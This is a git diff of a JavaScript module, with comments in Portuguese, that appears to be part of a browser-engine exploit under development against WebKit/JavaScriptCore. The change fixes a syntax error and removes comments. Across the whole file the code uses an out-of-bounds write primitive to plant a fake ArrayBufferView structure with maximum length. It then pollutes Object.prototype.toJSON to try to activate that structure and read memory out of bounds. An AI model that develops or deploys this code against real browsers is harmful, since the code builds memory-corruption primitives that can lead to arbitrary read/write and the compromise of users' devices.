@@ -14,36 +14,33 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v21_FocusActivation";
+const FNAME_MAIN = "ExploitLogic_v21b_SyntaxFix"; // Versão com correção de sintaxe
 
 // --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
 const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
-const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; // Placeholder
-const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       // Placeholder (Uint32ArrayType)
+const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
+const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
 const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
 const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
 const FAKE_VIEW_CELLINFO_STATE        = 0x01;
-// !! IMPORTANTE !! FAKE_VIEW_ASSOCIATED_BUFFER_PTR precisa ser o ponteiro real para o JSArrayBuffer do oob_array_buffer_real
-// para que a view seja válida. AdvancedInt64.Zero é um placeholder incorreto para um JSValue.
 const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
-const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; // m_vector = 0 (aponta para o início do buffer da view)
-const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     // m_length = MAX
-const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     // AllowShared
+const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; 
+const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     
+const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     
 
-// Valores de teste para plantar e ler com a SuperView
-const OOB_BUFFER_MARKER_OFFSET = 0x0; // Início do oob_array_buffer_real
+const OOB_BUFFER_MARKER_OFFSET = 0x0; 
 const OOB_BUFFER_MARKER_VALUE  = 0x41424344;
-const FAKE_VIEW_SID_READ_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB; // Para ler o SID da própria estrutura fake
-const OTHER_SID_READ_OFFSET    = 0x400; // Outro local de teste
+const FAKE_VIEW_SID_READ_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB; 
+const OTHER_SID_READ_OFFSET    = 0x400; 
 const OTHER_SID_READ_VALUE     = 0xFEEDFACE;
-
 
 let getter_activation_details = null;
 
 // ============================================================
 // FUNÇÃO toJSON Poluída para Testar Ativação da SuperView
 // ============================================================
-functiontoJSON_FocusActivationAttempt() {
+// CORREÇÃO APLICADA AQUI: Adicionado espaço entre "function" e o nome da função
+function toJSON_FocusActivationAttempt() {
     const FNAME_toJSON = "toJSON_FocusActivation";
     logS3(`[${FNAME_toJSON}] Getter ACIONADO!`, "vuln", FNAME_toJSON);
     getter_activation_details = {
@@ -59,7 +56,6 @@ functiontoJSON_FocusActivationAttempt() {
         getter_activation_details.this_type = Object.prototype.toString.call(this);
         logS3(`  [${FNAME_toJSON}] this type: ${getter_activation_details.this_type}`, "info", FNAME_toJSON);
 
-        // Acessar o length é geralmente o primeiro passo que pode falhar ou revelar a corrupção
         getter_activation_details.this_length = this.length;
         logS3(`  [${FNAME_toJSON}] this.length: ${toHex(getter_activation_details.this_length)} (Decimal: ${getter_activation_details.this_length})`, "leak", FNAME_toJSON);
 
@@ -68,7 +64,7 @@ functiontoJSON_FocusActivationAttempt() {
             document.title = "SUPERVIEW ACTIVE?!";
 
             try {
-                const val_marker = this[OOB_BUFFER_MARKER_OFFSET / 4]; // Divide por 4 para índice Uint32
+                const val_marker = this[OOB_BUFFER_MARKER_OFFSET / 4]; 
                 getter_activation_details.read_oob_marker = toHex(val_marker);
                 logS3(`    [SuperView?] this[${OOB_BUFFER_MARKER_OFFSET / 4}] (lendo OOB_BUFFER_MARKER_VALUE de ${toHex(OOB_BUFFER_MARKER_OFFSET)}): ${toHex(val_marker)} (Esperado: ${toHex(OOB_BUFFER_MARKER_VALUE)})`, "leak", FNAME_toJSON);
                 if (val_marker !== OOB_BUFFER_MARKER_VALUE) {
@@ -116,22 +112,21 @@ functiontoJSON_FocusActivationAttempt() {
 }
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v21_FocusActivation)
+// FUNÇÃO PRINCIPAL (v21b_SyntaxFix)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
     const FNAME_CURRENT_TEST = `${FNAME_MAIN}.focusFakeViewActivation`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Foco na Ativação da View Fake em 0x58 via toJSON ---`, "test", FNAME_CURRENT_TEST);
-    document.title = "FocusActivation v21 Test...";
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Foco na Ativação da View Fake em 0x58 via toJSON (Syntax Fix) ---`, "test", FNAME_CURRENT_TEST);
+    document.title = "FocusActivation v21b Test...";
 
-    getter_activation_details = null; // Resetar
-    let trigger_obj = { p1: "trigger_data", p2: { n1: 123 }}; // Objeto para JSON.stringify
+    getter_activation_details = null; 
+    let trigger_obj = { p1: "trigger_data", p2: { n1: 123 }}; 
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView em FAKE_VIEW_BASE_OFFSET_IN_OOB (0x58)
         logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
         const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
         const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
@@ -145,13 +140,12 @@ export async function sprayAndInvestigateObjectExposure() {
         oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
         oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
         oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
-        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); // Placeholder!
+        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); 
         oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
         oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4);
         oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
         logS3(`  Estrutura fake plantada. SID: ${toHex(FAKE_VIEW_STRUCTURE_ID)}, m_vec: ${FAKE_VIEW_MVECTOR_VALUE.toString(true)}, m_len: ${toHex(FAKE_VIEW_MLENGTH_VALUE)}.`, "good", FNAME_CURRENT_TEST);
 
-        // PASSO 1.5: Plantar valores de teste no oob_array_buffer_real
         oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
         logS3(`  Plantado OOB_BUFFER_MARKER_VALUE (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
         oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
@@ -159,7 +153,6 @@ export async function sprayAndInvestigateObjectExposure() {
         
         await PAUSE_S3(100);
 
-        // PASSO 2: Tentar ativar/usar a estrutura fake via poluição de toJSON
         logS3(`PASSO 2: Tentando ativação especulativa via JSON.stringify e toJSON poluído...`, "test", FNAME_CURRENT_TEST);
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -167,15 +160,15 @@ export async function sprayAndInvestigateObjectExposure() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_FocusActivationAttempt, // Corrigido para o nome da função
+                value: toJSON_FocusActivationAttempt, 
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
             logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_FocusActivationAttempt.name}.`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(trigger_obj)... Trigger: ${JSON.stringify(trigger_obj)}`, "info", FNAME_CURRENT_TEST);
-            await PAUSE_S3(50); // Pausa antes da chamada crítica
-            let stringifyResult = JSON.stringify(trigger_obj); // PONTO CRÍTICO
+            await PAUSE_S3(50); 
+            let stringifyResult = JSON.stringify(trigger_obj); 
             
             logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_CURRENT_TEST);
             if (getter_activation_details) {
